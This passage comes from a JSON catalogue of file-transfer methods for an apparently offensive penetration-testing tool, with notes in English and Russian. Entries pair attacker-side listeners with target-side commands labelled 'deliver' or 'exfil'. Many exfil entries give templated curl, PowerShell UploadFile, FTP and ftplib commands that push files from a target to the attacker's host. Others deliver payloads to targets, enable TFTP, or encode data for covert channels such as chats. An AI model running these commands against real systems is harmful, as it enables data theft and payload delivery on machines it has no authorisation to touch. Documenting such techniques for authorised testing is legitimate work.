    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/server.key -out /tmp/server.crt -days 1 -subj \"/CN={lhost}\" && cat /tmp/server.crt /tmp/server.key > /tmp/server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && openssl s_server -accept {lport} -cert /tmp/server.crt -key /tmp/server.key -WWW"
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "iwr \"https://{lhost}:{lport}/{file}\" -OutFile \"{remotefile}\" -SkipCertificateCheck"
      }
    ],
    "requires": [
      "PowerShell 7+",
      "openssl"
    ],
    "note": {
      "en": "PowerShell 7+ with -SkipCertificateCheck. In Windows PowerShell 5.1 this parameter does not exist.",
      "ru": "PowerShell 7+ с -SkipCertificateCheck. В Windows PowerShell 5.1 этого параметра нет."
    },
    "docs": "docs/en/01-attacker-to-target.md"
  },
  {
    "id": "https-uploadserver-linux",
    "title": "HTTPS uploadserver (Linux)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "https",
    "family": "uploadserver",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/server.key -out /tmp/server.crt -days 1 -subj \"/CN={lhost}\" && cat /tmp/server.crt /tmp/server.key > /tmp/server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && uploadserver {lport} --server-certificate /tmp/server.pem"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -k -X POST \"https://{lhost}:{lport}/upload\" -F \"files=@{remotefile}\""
      }
    ],
    "requires": [
      "uploadserver",
      "openssl",
      "curl"
    ],
    "note": {
      "en": "uploadserver over TLS. The multipart field must be files; curl uses -k for the self-signed certificate.",
      "ru": "uploadserver с TLS. Multipart-поле должно называться files; curl использует -k для самоподписанного сертификата."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "https-uploadserver-win",
    "title": "HTTPS uploadserver (Windows)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "https",
    "family": "uploadserver",
    "priority": 20,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/server.key -out /tmp/server.crt -days 1 -subj \"/CN={lhost}\" && cat /tmp/server.crt /tmp/server.key > /tmp/server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && uploadserver {lport} --server-certificate /tmp/server.pem"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe -k -X POST \"https://{lhost}:{lport}/upload\" -F \"files=@{remotefile}\""
      }
    ],
    "requires": [
      "uploadserver",
      "openssl",
      "curl.exe"
    ],
    "note": {
      "en": "uploadserver over TLS. The multipart field must be files; curl.exe uses -k.",
      "ru": "uploadserver с TLS. Multipart-поле должно называться files; curl.exe использует -k."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "https-updog-linux",
    "title": "HTTPS updog (Linux)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "https",
    "family": "updog",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "updog -d {lhostpath} -p {lport} --ssl"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -k -X POST -F \"file=@{remotefile}\" -F \"path=.\" \"https://{lhost}:{lport}/upload\""
      }
    ],
    "requires": [
      "updog",
      "curl"
    ],
    "note": {
      "en": "updog generates an ad-hoc certificate with --ssl; curl uses -k. The field name is file and path=.",
      "ru": "updog создаёт временный сертификат с --ssl; curl использует -k. Имя поля — file, path=."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "https-updog-win",
    "title": "HTTPS updog (Windows)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "https",
    "family": "updog",
    "priority": 20,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "updog -d {lhostpath} -p {lport} --ssl"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe -k -X POST -F \"file=@{remotefile}\" -F \"path=.\" \"https://{lhost}:{lport}/upload\""
      }
    ],
    "requires": [
      "updog",
      "curl.exe"
    ],
    "note": {
      "en": "updog HTTPS with an ad-hoc certificate; curl.exe uses -k.",
      "ru": "updog HTTPS с временным сертификатом; curl.exe использует -k."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "https-servpy-linux",
    "title": "HTTPS serv.py (Linux)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "https",
    "family": "servpy",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/server.key -out /tmp/server.crt -days 1 -subj \"/CN={lhost}\" && cat /tmp/server.crt /tmp/server.key > /tmp/server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 serv.py -p {lport} -d {lhostpath} --tls-cert /tmp/server.crt --tls-key /tmp/server.key"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -k --data-binary \"@{remotefile}\" \"https://{lhost}:{lport}/upload?file={file}\""
      }
    ],
    "requires": [
      "serv.py",
      "openssl",
      "curl"
    ],
    "note": {
      "en": "serv.py with TLS. It accepts a raw POST body; curl uses -k for the self-signed certificate.",
      "ru": "serv.py с TLS. Принимает raw POST body; curl использует -k для самоподписанного сертификата."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "https-servpy-win",
    "title": "HTTPS serv.py (Windows)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "https",
    "family": "servpy",
    "priority": 20,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/server.key -out /tmp/server.crt -days 1 -subj \"/CN={lhost}\" && cat /tmp/server.crt /tmp/server.key > /tmp/server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 serv.py -p {lport} -d {lhostpath} --tls-cert /tmp/server.crt --tls-key /tmp/server.key"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe -k --data-binary \"@{remotefile}\" \"https://{lhost}:{lport}/upload?file={file}\""
      }
    ],
    "requires": [
      "serv.py",
      "openssl",
      "curl.exe"
    ],
    "note": {
      "en": "serv.py with TLS; curl.exe sends the raw body with -k.",
      "ru": "serv.py с TLS; curl.exe отправляет raw body с -k."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "ftp",
    "family": "powershell",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "PowerShell"
    ],
    "note": {
      "en": "Anonymous PowerShell download. No credentials are sent.",
      "ru": "Анонимное скачивание через PowerShell. Учётные данные не отправляются."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "powershell",
      "text": "(New-Object Net.WebClient).DownloadFile(\"ftp://{lhost}:{lport}/{file}\", \"{remotefile}\")"
    },
    "id": "ftp-win-ps-anon",
    "title": "PowerShell WebClient (anonymous)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "ftp",
    "family": "powershell",
    "priority": 20,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "PowerShell"
    ],
    "note": {
      "en": "Authenticated PowerShell download. The server starts with Share user/password.",
      "ru": "Скачивание через PowerShell с учёткой. Сервер запускается с пользователем и паролем шары."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "powershell",
      "text": "$c=New-Object Net.WebClient;$c.Credentials=New-Object System.Net.NetworkCredential(\"{share_user}\",\"{share_pass}\");$c.DownloadFile(\"ftp://{lhost}:{lport}/{file}\",\"{remotefile}\")"
    },
    "id": "ftp-win-ps-auth",
    "title": "PowerShell WebClient (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "ftp",
    "family": "cmd",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "ftp.exe"
    ],
    "note": {
      "en": "Builds ftp.txt and runs it from the RHOST directory. Anonymous login; the file lands in the current directory.",
      "ru": "Создаёт ftp.txt и запускает его из каталога RHOST. Анонимный вход; файл попадёт в текущий каталог."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "cmd",
      "text": "cd /d \"{remote}\" && (echo open {lhost} {lport} & echo USER anonymous & echo PASS anonymous & echo binary & echo GET {file} & echo bye) > ftp.txt & ftp -v -n -s:ftp.txt"
    },
    "id": "ftp-win-cmd-anon",
    "title": "CMD ftp script (anonymous)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "ftp",
    "family": "cmd",
    "priority": 20,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "ftp.exe"
    ],
    "note": {
      "en": "Builds ftp.txt with Share user/password and runs it from the RHOST directory.",
      "ru": "Создаёт ftp.txt с пользователем и паролем шары и запускает из каталога RHOST."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "cmd",
      "text": "cd /d \"{remote}\" && (echo open {lhost} {lport} & echo USER {share_user} & echo PASS {share_pass} & echo binary & echo GET {file} & echo bye) > ftp.txt & ftp -v -n -s:ftp.txt"
    },
    "id": "ftp-win-cmd-auth",
    "title": "CMD ftp script (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "ftp",
    "family": "curl",
    "priority": 30,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "curl.exe"
    ],
    "note": {
      "en": "curl with credentials and passive mode; the safest option behind NAT.",
      "ru": "curl с учёткой и passive mode; самый надёжный вариант за NAT."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "cmd",
      "text": "curl.exe -s --ftp-pasv -u {share_user}:{share_pass} \"ftp://{lhost}:{lport}/{file}\" -o \"{remotefile}\""
    },
    "id": "ftp-win-curl-auth",
    "title": "curl passive (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "ftp",
    "family": "powershell",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "PowerShell"
    ],
    "note": {
      "en": "Anonymous upload with WebClient.UploadFile.",
      "ru": "Анонимная загрузка через WebClient.UploadFile."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "powershell",
      "text": "(New-Object Net.WebClient).UploadFile(\"ftp://{lhost}:{lport}/{file}\", \"{remotefile}\")"
    },
    "id": "ftp-win-ps-anon-up",
    "title": "PowerShell UploadFile (anonymous)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "ftp",
    "family": "powershell",
    "priority": 20,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "PowerShell"
    ],
    "note": {
      "en": "Authenticated upload with WebClient.UploadFile.",
      "ru": "Загрузка через WebClient.UploadFile с учёткой."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "powershell",
      "text": "$c=New-Object Net.WebClient;$c.Credentials=New-Object System.Net.NetworkCredential(\"{share_user}\",\"{share_pass}\");$c.UploadFile(\"ftp://{lhost}:{lport}/{file}\",\"{remotefile}\")"
    },
    "id": "ftp-win-ps-auth-up",
    "title": "PowerShell UploadFile (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "ftp",
    "family": "cmd",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "ftp.exe"
    ],
    "note": {
      "en": "Builds ftp_up.txt and uploads the file from the RHOST directory.",
      "ru": "Создаёт ftp_up.txt и загружает файл из каталога RHOST."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "cmd",
      "text": "cd /d \"{remote}\" && (echo open {lhost} {lport} & echo USER anonymous & echo PASS anonymous & echo binary & echo put {file} & echo bye) > ftp_up.txt & ftp -v -n -s:ftp_up.txt"
    },
    "id": "ftp-win-cmd-anon-up",
    "title": "CMD ftp put (anonymous)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "ftp",
    "family": "cmd",
    "priority": 20,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "ftp.exe"
    ],
    "note": {
      "en": "Builds ftp_up.txt with Share user/password and uploads the file.",
      "ru": "Создаёт ftp_up.txt с пользователем и паролем шары и загружает файл."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "cmd",
      "text": "cd /d \"{remote}\" && (echo open {lhost} {lport} & echo USER {share_user} & echo PASS {share_pass} & echo binary & echo put {file} & echo bye) > ftp_up.txt & ftp -v -n -s:ftp_up.txt"
    },
    "id": "ftp-win-cmd-auth-up",
    "title": "CMD ftp put (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "ftp",
    "family": "curl",
    "priority": 30,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "curl.exe"
    ],
    "note": {
      "en": "curl upload with credentials; --ftp-create-dirs creates the remote path.",
      "ru": "Загрузка через curl с учёткой; --ftp-create-dirs создаёт удалённый путь."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "cmd",
      "text": "curl.exe -s --ftp-create-dirs -u {share_user}:{share_pass} -T \"{remotefile}\" \"ftp://{lhost}:{lport}/{file}\""
    },
    "id": "ftp-win-curl-auth-up",
    "title": "curl upload (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "ftp",
    "family": "ftp",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "ftp"
    ],
    "note": {
      "en": "Non-interactive ftp client with credentials. get accepts a local destination path.",
      "ru": "Неинтерактивный ftp-клиент с учёткой. get принимает локальный путь назначения."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "bash",
      "text": "ftp -n {lhost} {lport} <<EOF\nuser {share_user} {share_pass}\nbinary\nget {file} \"{remotefile}\"\nquit\nEOF"
    },
    "id": "ftp-linux-ftp-auth",
    "title": "ftp heredoc (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "ftp",
    "family": "curl",
    "priority": 20,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "curl"
    ],
    "note": {
      "en": "curl with credentials and passive mode.",
      "ru": "curl с учёткой и passive mode."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "bash",
      "text": "curl -s --ftp-pasv -u {share_user}:{share_pass} \"ftp://{lhost}:{lport}/{file}\" -o \"{remotefile}\""
    },
    "id": "ftp-linux-curl-auth",
    "title": "curl passive (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "ftp",
    "family": "wget",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "wget"
    ],
    "note": {
      "en": "Anonymous wget download.",
      "ru": "Анонимное скачивание через wget."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "bash",
      "text": "wget -q \"ftp://{lhost}:{lport}/{file}\" -O \"{remotefile}\""
    },
    "id": "ftp-linux-wget-anon",
    "title": "wget (anonymous)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "ftp",
    "family": "python",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "python3"
    ],
    "note": {
      "en": "ftplib when no FTP client is installed. RETR writes directly into the local file.",
      "ru": "ftplib, когда FTP-клиента нет. RETR пишет прямо в локальный файл."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "bash",
      "text": "python3 -c 'import ftplib;f=ftplib.FTP();f.connect(\"{lhost}\",{lport});f.login(\"{share_user}\",\"{share_pass}\");f.retrbinary(\"RETR {file}\", open(\"{remotefile}\",\"wb\").write)'"
    },
    "id": "ftp-linux-python-auth",
    "title": "python3 ftplib (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "ftp",
    "family": "ftp",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "ftp"
    ],
    "note": {
      "en": "Non-interactive ftp upload with credentials.",
      "ru": "Неинтерактивная загрузка через ftp с учёткой."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "bash",
      "text": "ftp -n {lhost} {lport} <<EOF\nuser {share_user} {share_pass}\nbinary\nput \"{remotefile}\" {file}\nquit\nEOF"
    },
    "id": "ftp-linux-ftp-auth-up",
    "title": "ftp heredoc (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "ftp",
    "family": "curl",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "curl"
    ],
    "note": {
      "en": "Anonymous curl upload; the empty password is intentional.",
      "ru": "Анонимная загрузка через curl; пустой пароль указан намеренно."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "bash",
      "text": "curl -s -T \"{remotefile}\" --user anonymous: \"ftp://{lhost}:{lport}/{file}\""
    },
    "id": "ftp-linux-curl-anon-up",
    "title": "curl upload (anonymous)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "ftp",
    "family": "curl",
    "priority": 20,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "curl"
    ],
    "note": {
      "en": "curl upload with credentials.",
      "ru": "Загрузка через curl с учёткой."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "bash",
      "text": "curl -s -T \"{remotefile}\" --user {share_user}:{share_pass} \"ftp://{lhost}:{lport}/{file}\""
    },
    "id": "ftp-linux-curl-auth-up",
    "title": "curl upload (auth)"
  },
  {
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "ftp",
    "family": "python",
    "priority": 10,
    "source": "05",
    "docs": "docs/en/05-ftp.md",
    "requires": [
      "pyftpdlib",
      "python3"
    ],
    "note": {
      "en": "ftplib upload when no FTP client is installed.",
      "ru": "Загрузка через ftplib, когда FTP-клиента нет."
    },
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --username={share_user} --password={share_pass} --write --directory {lhostpath}"
    },
    "client": {
      "shell": "bash",
      "text": "python3 -c 'import ftplib;f=ftplib.FTP();f.connect(\"{lhost}\",{lport});f.login(\"{share_user}\",\"{share_pass}\");f.storbinary(\"STOR {file}\", open(\"{remotefile}\",\"rb\"))'"
    },
    "id": "ftp-linux-python-auth-up",
    "title": "python3 ftplib upload (auth)"
  },
  {
    "id": "ftp-diagnostics",
    "title": "FTP diagnostics",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "channel": "ftp",
    "family": "diagnostics",
    "priority": 10,
    "source": "05",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "nc -zv {lhost} {lport}"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -v \"ftp://{lhost}:{lport}/\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ss -tlnp | grep {lport}"
      }
    ],
    "requires": [
      "nc",
      "curl",
      "ss"
    ],
    "note": {
      "en": "Checks the port, FTP banner/login and whether pyftpdlib is listening on LHOST.",
      "ru": "Проверяет порт, FTP-баннер/логин и слушает ли pyftpdlib на LHOST."
    },
    "docs": "docs/en/05-ftp.md"
  },
  {
    "id": "tftp-enable-win",
    "title": "Enable TFTP client (Windows)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "tftp",
    "family": "setup",
    "priority": 10,
    "source": "12",
    "steps": [
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "Enable-WindowsOptionalFeature -Online -FeatureName TFTP -All"
      }
    ],
    "requires": [
      "Administrator"
    ],
    "warning": {
      "en": "Changes a Windows optional feature and may require a reboot. Disable TFTP after the transfer if it was not enabled before.",
      "ru": "Меняет опциональный компонент Windows; может потребоваться перезагрузка. Отключите TFTP после передачи, если он не был включён раньше."
    },
    "note": {
      "en": "The TFTP client is disabled by default on Windows. Run this elevated, then use the native tftp.exe methods. The payload must be in /tftp on LHOST.",
      "ru": "TFTP-клиент в Windows по умолчанию отключён. Запустите elevated, затем используйте методы с tftp.exe. Payload должен лежать в /tftp на LHOST."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "enc-base64url-deliver",
    "title": "Base64url (deliver)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base64",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "basenc --base64url < \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b64url\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "basenc -d --base64url < \"{remotefile}.b64url\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "basenc"
    ],
    "note": {
      "en": "URL-safe Base64 alphabet; no +/, no padding. Encode on LHOST, transfer the .b64url file, decode on RHOST.",
      "ru": "URL-safe алфавит Base64; без +/, без padding. Кодируйте на LHOST, передайте файл .b64url и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base64url-exfil",
    "title": "Base64url (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base64",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "basenc --base64url < \"{remotefile}\" > \"{remotefile}.b64url\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "basenc -d --base64url < \"{lhostpath}/{file}.b64url\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "basenc"
    ],
    "note": {
      "en": "URL-safe Base64 alphabet; no +/, no padding. Encode on RHOST, transfer the .b64url file, decode on LHOST.",
      "ru": "URL-safe алфавит Base64; без +/, без padding. Кодируйте на RHOST, передайте файл .b64url и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base32hex-deliver",
    "title": "Base32hex (deliver)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "base32",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "basenc --base32hex < \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b32h\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "basenc -d --base32hex < \"{remotefile}.b32h\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "basenc"
    ],
    "note": {
      "en": "Base32 with the 0-9A-V alphabet, useful for sortable text channels. Encode on LHOST, transfer the .b32h file, decode on RHOST.",
      "ru": "Base32 с алфавитом 0-9A-V; удобно для сортируемых текстовых каналов. Кодируйте на LHOST, передайте файл .b32h и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base32hex-exfil",
    "title": "Base32hex (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base32",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "basenc --base32hex < \"{remotefile}\" > \"{remotefile}.b32h\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "basenc -d --base32hex < \"{lhostpath}/{file}.b32h\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "basenc"
    ],
    "note": {
      "en": "Base32 with the 0-9A-V alphabet, useful for sortable text channels. Encode on RHOST, transfer the .b32h file, decode on LHOST.",
      "ru": "Base32 с алфавитом 0-9A-V; удобно для сортируемых текстовых каналов. Кодируйте на RHOST, передайте файл .b32h и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base2048-deliver",
    "title": "Base2048 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "unicode",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base2048,sys;sys.stdout.write(base2048.encode(open(sys.argv[1],'rb').read()))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b2048\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base2048,sys;open(sys.argv[2],'wb').write(base2048.decode(open(sys.argv[1],encoding='utf-8').read().strip()))\" \"{remotefile}.b2048\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "base2048"
    ],
    "note": {
      "en": "Unicode text encoding for chats and social channels; the result contains non-ASCII characters. Encode on LHOST, transfer the .b2048 file, decode on RHOST.",
      "ru": "Unicode-кодирование для чатов и соцсетей; результат содержит не-ASCII символы. Кодируйте на LHOST, передайте файл .b2048 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base2048-exfil",
    "title": "Base2048 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "unicode",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base2048,sys;sys.stdout.write(base2048.encode(open(sys.argv[1],'rb').read()))\" \"{remotefile}\" > \"{remotefile}.b2048\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base2048,sys;open(sys.argv[2],'wb').write(base2048.decode(open(sys.argv[1],encoding='utf-8').read().strip()))\" \"{lhostpath}/{file}.b2048\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3",
      "base2048"
    ],
    "note": {
      "en": "Unicode text encoding for chats and social channels; the result contains non-ASCII characters. Encode on RHOST, transfer the .b2048 file, decode on LHOST.",
      "ru": "Unicode-кодирование для чатов и соцсетей; результат содержит не-ASCII символы. Кодируйте на RHOST, передайте файл .b2048 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base32768-deliver",
    "title": "Base32768 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "unicode",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
